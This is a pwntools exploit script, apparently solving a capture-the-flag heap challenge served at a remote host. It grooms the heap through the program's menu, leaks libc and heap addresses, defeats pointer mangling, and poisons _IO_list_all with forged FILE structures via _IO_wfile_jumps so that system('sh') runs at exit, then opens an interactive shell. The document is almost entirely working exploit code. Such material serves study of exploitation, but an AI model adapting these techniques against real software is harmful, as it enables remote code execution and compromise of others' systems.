#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './prob_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '43.203.168.199', 13379

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
complete_no = 0

def create(idx, title, desc):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b':', title)
    io.sendafter(b':', desc)

def edit(idx, desc):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendafter(b'Desc :', desc)

def read(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def complete(idx):
    global complete_no
    no = complete_no
    complete_no += 1
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b':', str(idx).encode())
    log.info("complete %d", no)
    return no

def load(no, idx):
    io.sendlineafter(b'>', b'5')
    io.sendlineafter(b':', str(no).encode())
    io.sendlineafter(b':', str(idx).encode())

def delete(idx):
    io.sendlineafter(b'>', b'6')
    io.sendlineafter(b':', str(idx).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    title = b'0||'+b'A'*(0xf-3)
    create(0, title, cyclic(10) + p64(0x441))
    unsorted_size = complete(0)

    create(1, b'0', b'0')
    create(3, b'0', b'0')
    create(6, b'0', b'0')
    for _ in range(40-1):
        create(2, b'0', b'0')

    load(unsorted_size, 0)
    delete(1)
    delete(0)

    create(2, title, cyclic(10))
    read(3)
    io.recvuntil(b'Desc : ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x203b20

    create(4, b'0', b'0')
    create(1, b'0', b'0')
    delete(3)

    read(4)
    io.recvuntil(b'Desc : ')
    heap = demangle(u64(io.recv(6).ljust(8, b'\x00'))) - 0x2c0

    # clear bins
    for _ in range(40-1):
        create(2, b'0', b'0')

    fp = heap + 0x920
    create(0, b'0', b'  sh\x00\x00\x00\x00')
    create(2, b'1', b'1')
    create(2, b'2', b'2')
    create(3, b'3', p64(0x0) + p64(libc.sym['system']))
    create(4, b'4', p64(0x0) + p64(fp-0x10))
    create(5, b'5', p64(fp+0x8))
    create(7, b'6', b'6')
    create(7, b'7', p64(0x0) + p64(fp))
    create(2, b'8', b'8')

    create(0, title, cyclic(10) + p64(libc.sym['_IO_wfile_jumps']))
    wfile_jumps = complete(0)

    delete(6)
    load(wfile_jumps, 6)

    create(0, b'0', b'0')
    delete(1)
    delete(0)
    edit(6, p64(mangle(heap, libc.symbols['_IO_list_all'])))

    create(1, b'0', p64(fp))
    link_io = complete(1)
    load(link_io, 1)
    load(link_io, 1)
    load(link_io, 1)
    load(link_io, 1)

    delete(999) # exit

    log.info("heap: %#x", heap)
    log.info("fp: %#x", fp)
    log.info("io list all: %#x", libc.symbols['_IO_list_all'])
    log.info("libc base: %#x", libc.address)
    log.info("environ: %#x", libc.symbols['environ'])
    io.interactive()
    
if __name__ == '__main__':
    exploit()